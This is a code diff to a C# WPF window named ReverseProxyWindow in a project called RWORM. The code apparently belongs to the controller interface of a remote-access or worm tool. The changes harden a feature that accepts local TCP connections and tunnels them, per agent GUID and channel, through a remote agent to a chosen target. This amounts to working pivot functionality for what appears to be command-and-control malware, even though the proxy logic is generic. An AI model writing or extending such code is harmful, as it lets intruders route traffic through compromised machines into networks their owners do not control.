@@ -11,13 +11,45 @@ namespace RWORM.GUI.Views
 {
     public partial class ReverseProxyWindow : Window
     {
+        private class LocalProxyClient : IDisposable
+        {
+            public int ChannelId { get; }
+            public TcpClient Tcp { get; }
+            public NetworkStream Stream { get; }
+            public CancellationTokenSource Cts { get; }
+            public SemaphoreSlim SendLock { get; }
+            private int _disposed;
+
+            public bool IsDisposed => Volatile.Read(ref _disposed) != 0;
+
+            public LocalProxyClient(int channelId, TcpClient tcp, NetworkStream stream)
+            {
+                ChannelId = channelId;
+                Tcp = tcp;
+                Stream = stream;
+                Cts = new CancellationTokenSource();
+                SendLock = new SemaphoreSlim(1, 1);
+            }
+
+            public void Dispose()
+            {
+                if (Interlocked.Exchange(ref _disposed, 1) != 0) return;
+                try { Cts.Cancel(); } catch { }
+                try { Stream.Dispose(); } catch { }
+                try { Tcp.Close(); } catch { }
+                try { Cts.Dispose(); } catch { }
+                try { SendLock.Dispose(); } catch { }
+            }
+        }
+
         private readonly ServerConnection _server;
         private readonly string _guid;
         private TcpListener? _listener;
         private CancellationTokenSource? _cts;
-        private readonly ConcurrentDictionary<int, TcpClient> _clients = new();
+        private readonly ConcurrentDictionary<int, LocalProxyClient> _clients = new();
         private int _channelCounter = 100;
-        private bool _running = false;
+        private volatile bool _running = false;
+        private int _totalBytesForwarded = 0;
 
         public ReverseProxyWindow(ServerConnection server, string guid, string hostname)
         {
@@ -33,14 +65,18 @@ namespace RWORM.GUI.Views
 
         private void Log(string msg)
         {
-            Dispatcher.Invoke(() =>
+            try
             {
-                TxtLogs.AppendText($"[{DateTime.Now:HH:mm:ss}] {msg}\r\n");
-                TxtLogs.ScrollToEnd();
-            });
+                Dispatcher.Invoke(() =>
+                {
+                    TxtLogs.AppendText($"[{DateTime.Now:HH:mm:ss}] {msg}\r\n");
+                    TxtLogs.ScrollToEnd();
+                });
+            }
+            catch { }
         }
 
-        private async void Toggle_Click(object sender, RoutedEventArgs e)
+        private void Toggle_Click(object sender, RoutedEventArgs e)
         {
             if (_running)
             {
@@ -60,11 +96,11 @@ namespace RWORM.GUI.Views
                     return;
                 }
 
-                await StartProxy(port, target);
+                StartProxy(port, target);
             }
         }
 
-        private async Task StartProxy(int port, string target)
+        private void StartProxy(int port, string target)
         {
             try
             {
@@ -91,97 +127,150 @@ namespace RWORM.GUI.Views
 
         private async Task AcceptLoopAsync(string target, CancellationToken ct)
         {
-            while (!ct.IsCancellationRequested && _listener != null)
+            while (!ct.IsCancellationRequested && _listener != null && _running)
             {
                 try
                 {
                     var incoming = await _listener.AcceptTcpClientAsync(ct);
+                    incoming.NoDelay = true;
                     int chan = Interlocked.Increment(ref _channelCounter);
-                    _clients[chan] = incoming;
-                    Log($"New local connection on channel #{chan} from {incoming.Client.RemoteEndPoint}");
+                    var client = new LocalProxyClient(chan, incoming, incoming.GetStream());
+                    _clients[chan] = client;
 
-                    // Ask client to connect to target on this channel
+                    Log($"[Channel #{chan}] Local inbound connection accepted from {incoming.Client.RemoteEndPoint}");
+
+                    // Initiate tunnel on remote agent
                     await _server.ProxyStart(_guid, chan, target);
 
-                    // Start pump from local app to remote client
-                    _ = PumpLocalToRemoteAsync(chan, incoming, ct);
+                    // Pump local stream to remote agent
+                    _ = PumpLocalToRemoteAsync(client, ct);
                 }
-                catch { break; }
+                catch (OperationCanceledException)
+                {
+                    break;
+                }
+                catch (Exception ex)
+                {
+                    if (_running)
+                    {
+                        Log($"[Accept Error] {ex.Message}");
+                    }
+                    break;
+                }
             }
         }
 
-        private async Task PumpLocalToRemoteAsync(int chan, TcpClient tcp, CancellationToken ct)
+        private async Task PumpLocalToRemoteAsync(LocalProxyClient client, CancellationToken ct)
         {
             byte[] buf = new byte[8192];
+            using var linkedCts = CancellationTokenSource.CreateLinkedTokenSource(ct, client.Cts.Token);
+            var token = linkedCts.Token;
+
             try
             {
-                var stream = tcp.GetStream();
-                while (!ct.IsCancellationRequested && tcp.Connected)
+                while (!token.IsCancellationRequested && _running && client.Tcp.Connected)
                 {
-                    int read = await stream.ReadAsync(buf, 0, buf.Length, ct);
+                    int read = await client.Stream.ReadAsync(buf, 0, buf.Length, token);
                     if (read <= 0) break;
 
                     byte[] chunk = new byte[read];
                     Buffer.BlockCopy(buf, 0, chunk, 0, read);
-                    await _server.ProxySend(_guid, chan, chunk);
+
+                    await _server.ProxySend(_guid, client.ChannelId, chunk);
+                    Interlocked.Add(ref _totalBytesForwarded, read);
                 }
             }
-            catch { }
+            catch
+            {
+                // Connection teardown
+            }
             finally
             {
-                CloseChannel(chan);
+                CloseChannel(client.ChannelId, notifyRemote: true);
             }
         }
 
         private void OnProxyDataFromClient(byte[] data, int chan)
         {
-            if (_clients.TryGetValue(chan, out var tcp) && tcp.Connected)
+            if (data == null || data.Length == 0) return;
+
+            if (_clients.TryGetValue(chan, out var client) && !client.IsDisposed && client.Tcp.Connected)
             {
-                try
+                _ = Task.Run(async () =>
                 {
-                    var stream = tcp.GetStream();
-                    stream.Write(data, 0, data.Length);
-                    stream.Flush();
-                }
-                catch
-                {
-                    CloseChannel(chan);
-                }
+                    try
+                    {
+                        await client.SendLock.WaitAsync(client.Cts.Token);
+                        try
+                        {
+                            await client.Stream.WriteAsync(data, 0, data.Length, client.Cts.Token);
+                            await client.Stream.FlushAsync(client.Cts.Token);
+                        }
+                        finally
+                        {
+                            client.SendLock.Release();
+                        }
+                    }
+                    catch
+                    {
+                        CloseChannel(chan, notifyRemote: true);
+                    }
+                });
             }
         }
 
-        private void CloseChannel(int chan)
+        private void CloseChannel(int chan, bool notifyRemote)
         {
-            if (_clients.TryRemove(chan, out var tcp))
+            if (_clients.TryRemove(chan, out var client))
             {
-                try { tcp.Close(); } catch { }
-                Log($"Channel #{chan} closed.");
-                _ = _server.ProxyStop(_guid, chan);
+                client.Dispose();
+                Log($"[Channel #{chan}] Channel closed.");
+
+                if (notifyRemote && _running)
+                {
+                    try
+                    {
+                        _ = _server.ProxyStop(_guid, chan);
+                    }
+                    catch { }
+                }
             }
         }
 
         private void StopProxy()
         {
+            if (!_running) return;
             _running = false;
+
             try { _cts?.Cancel(); } catch { }
             try { _listener?.Stop(); } catch { }
             _listener = null;
 
             foreach (var kvp in _clients)
             {
-                try { kvp.Value.Close(); } catch { }
-                _ = _server.ProxyStop(_guid, kvp.Key);
+                if (_clients.TryRemove(kvp.Key, out var client))
+                {
+                    client.Dispose();
+                    try { _ = _server.ProxyStop(_guid, kvp.Key); } catch { }
+                }
             }
             _clients.Clear();
 
             _server.UnregisterProxyDataHandler(_guid);
 
-            BtnToggle.Content = "▶ Start Proxy";
-            BtnToggle.Style = (Style)FindResource("PrimaryButton");
-            TxtLocalPort.IsEnabled = true;
-            TxtTarget.IsEnabled = true;
-            StatusLabel.Text = "Proxy stopped.";
-            Log("Proxy stopped.");
+            try
+            {
+                Dispatcher.Invoke(() =>
+                {
+                    BtnToggle.Content = "▶ Start Proxy";
+                    BtnToggle.Style = (Style)FindResource("PrimaryButton");
+                    TxtLocalPort.IsEnabled = true;
+                    TxtTarget.IsEnabled = true;
+                    StatusLabel.Text = "Proxy stopped.";
+                    Log("Proxy stopped.");
+                });
+            }
+            catch { }
         }
     }
 }
